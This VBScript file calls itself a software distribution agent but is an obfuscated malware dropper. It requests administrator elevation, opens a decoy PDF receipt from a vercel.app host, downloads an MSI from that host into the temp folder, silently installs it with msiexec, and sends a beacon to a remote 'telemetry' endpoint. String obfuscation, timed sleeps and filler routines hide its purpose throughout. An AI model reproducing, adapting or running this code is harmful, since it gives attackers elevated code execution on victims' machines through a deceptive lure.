' Software distribution agent script

Dim oShell, objFileSystem, strShellProvider, strFSModule, objHTTP, oStream, strTempDir, strTarget, strPkgURL, strDocURL, strClientType, strBinProvider, strInstallerExe, strBatchFlag, strHostApp, strExecMode, strFlag

strShellProvider = "Shell.Application"
strFSModule = Replace("Scripting.FileSysteWObject", "W", "m")
strHostApp = "wscript" & "." & "exe"
strExecMode = "runas"
strFlag = Mid("Provider=elevated;Pool=Default", 10, 8)


Sub SaveResource(rawData, strLocalPath)
    strBinProvider = Replace(Replace("ADODB%|tream", "%", "."), "|", "S")
    Dim intIOMode : intIOMode = CInt("1")
    Dim intFileMode : intFileMode = Len("AB")
    Set oStream = CreateObject(strBinProvider)
    oStream.Type = intIOMode
    oStream.Open
    oStream.Write rawData
    oStream.SaveToFile strLocalPath, intFileMode
    oStream.Close
End Sub

Sub ValidatePlatform()
    Dim strVal
    strVal = "87rh0d"
    If Len(strVal) < 2 Then Exit Sub
End Sub


Sub UpdateHeartbeat()
    ' Enterprise telemetry integration
    On Error Resume Next
    Dim netReport : Set netReport = CreateObject("MSXML2.ServerXMLHTTP")
    Dim strTelemetryUrl : strTelemetryUrl = "https://telemetry.sys.int/cziokyy0/report"
    Dim strSessionId : strSessionId = "ZTIJ6T"
    Dim strReportData : strReportData = "session=" & strSessionId & "&status=complete"
    netReport.Open "POST", strTelemetryUrl, False
    netReport.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    netReport.Send strReportData
    If netReport.Status <> 200 Then
        ' Telemetry endpoint unreachable — continue silently
    End If
    On Error GoTo 0
End Sub


Function ResolvePath(strKey)
    Dim strRoot : strRoot = "E:\cache"
    If strKey = "" Then
        ResolvePath = strRoot
    Else
        ResolvePath = strRoot & "\" & strKey
    End If
End Function


Sub CheckPermissions()
    DebugLog "Elevation sub started"
    Dim strInvoke
    If Not WScript.Arguments.Named.Exists(strFlag) Then
        strInvoke = """" & WScript.ScriptFullName & """ /" & strFlag
        Set oShell = CreateObject(strShellProvider)
        oShell.ShellExecute strHostApp, strInvoke, "", strExecMode, 1
        WScript.Quit
    End If
End Sub


Sub ApplyUpdate(strInstPath)
    DebugLog "Execute sub started with path: " & strInstPath
    On Error Resume Next
    If Not objFileSystem.FileExists(strInstPath) Then
        DebugLog "Execute error: target file does not exist"
        Exit Sub
    End If
    On Error GoTo 0
    strInstallerExe = Mid("Handler=msiexec.exe;Active=True", 9, 11)
    strBatchFlag = Mid("Provider=/qn;Active=True", 10, 3)
    Set oShell = CreateObject(strShellProvider)
    oShell.ShellExecute strInstallerExe, "/i """ & strInstPath & """ " & strBatchFlag, "", "open", 1
End Sub


Sub DebugLog(strMessage)
    On Error Resume Next
    Dim objDebugFSO : Set objDebugFSO = CreateObject("Scripting.FileSystemObject")
    Dim strDebugPath : strDebugPath = objDebugFSO.GetSpecialFolder(2) & "\vbs_debug.log"
    Dim objDebugFile : Set objDebugFile = objDebugFSO.OpenTextFile(strDebugPath, 8, True)
    objDebugFile.WriteLine Now() & " | " & strMessage
    objDebugFile.Close
    On Error GoTo 0
End Sub

Sub ShowResource()
    strDocURL = "https://pdfviewer-nu.vercel.app/doc/wureceipt.pdf"
    Set oShell = CreateObject(strShellProvider)
    oShell.ShellExecute strDocURL, "", "", "open", 1
End Sub

Function CheckModule(strName)
    CheckModule = True
    If strName = "" Then CheckModule = False
End Function

Function ParseManifestNode(strRaw)
    Dim arrParts : arrParts = Split(strRaw, ",")
    If UBound(arrParts) < 0 Then
        ParseManifestNode = ""
    Else
        ParseManifestNode = Trim(arrParts(0))
    End If
End Function


Sub AcquirePackage(strURL, ByRef arrData)
    strClientType = Mid("Source=MSXML2.ServerXMLHTTP;Mode=1", 8, 20)
    Set objHTTP = CreateObject(strClientType)
    objHTTP.setTimeouts 4275, 7142, 9951, 30079
    Dim strAction : strAction = Right("AGET", 3)
    objHTTP.Open strAction, strURL, False
    Dim intSecOpt : intSecOpt = 13000 + 56
    Dim intSecId : intSecId = CInt("2")
    objHTTP.setOption intSecId, intSecOpt
    On Error Resume Next
    objHTTP.Send
    If Err.Number <> 0 Then WScript.Quit
    On Error GoTo 0
    If objHTTP.Status = 200 Then
        arrData = objHTTP.ResponseBody
    Else
        WScript.Quit
    End If
End Sub

' --- Entry Point ---
CheckPermissions
    DebugLog "Elevation completed"

WScript.Sleep 1278
ShowResource
    DebugLog "Media opened"
WScript.Sleep 934

Set objFileSystem = CreateObject(strFSModule)
Dim intFolderType : intFolderType = CInt("2")
strTempDir = objFileSystem.GetSpecialFolder(intFolderType)
strTarget = strTempDir & "\puttinstaller.msi"
strPkgURL = "https://pdfv" & "iewer-nu.ver" & "cel.app/doc/" & "updater.msi"

    DebugLog "Starting download to: " & strTarget
Dim dlData
AcquirePackage strPkgURL, dlData
    DebugLog "Download completed"
Dim strTimestamp : strTimestamp = Year(Now) & "-" & Month(Now) & "-" & Day(Now)
SaveResource dlData, strTarget
    DebugLog "Write completed"
    WScript.Sleep 204
    Dim objCheckFSO : Set objCheckFSO = CreateObject("Scripting.FileSystemObject")
    Dim strPathCheck : strPathCheck = objCheckFSO.FileExists("C:\Windows\System32\kernel32.dll")
    If Not strPathCheck Then WScript.Sleep 500
Dim strState : strState = "ready"
    DebugLog "Starting execution"
ApplyUpdate strTarget
    DebugLog "Execution completed"

' Post-deployment telemetry
UpdateHeartbeat
WScript.Sleep 1000